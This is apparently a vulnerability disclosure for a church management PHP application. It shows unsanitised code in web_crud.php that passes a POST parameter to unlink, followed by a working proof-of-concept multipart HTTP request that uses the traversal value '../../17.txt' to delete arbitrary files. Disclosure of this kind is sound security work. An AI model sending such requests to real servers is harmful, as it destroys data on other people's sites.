### Vulnerability file address

In line 425 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_testimonial_img']);`,` $_POST['old_testimonial_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['testimoinalphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["testimoinalphoto"]["name"]);

            if (move_uploaded_file($_FILES["testimoinalphoto"]["tmp_name"], $filepath)) {
                $img6 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_testimonial_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 389

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_testimonial_img"

../../17.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="testimoinalphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `17.txt` file in the `church/` directory

![image-20250505162855277](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051628310.png)

Then we execute the above poc to attack

![image-20250505162946353](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051629381.png)

Files are deleted after the attack is successful

![image-20250505162954389](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051629417.png)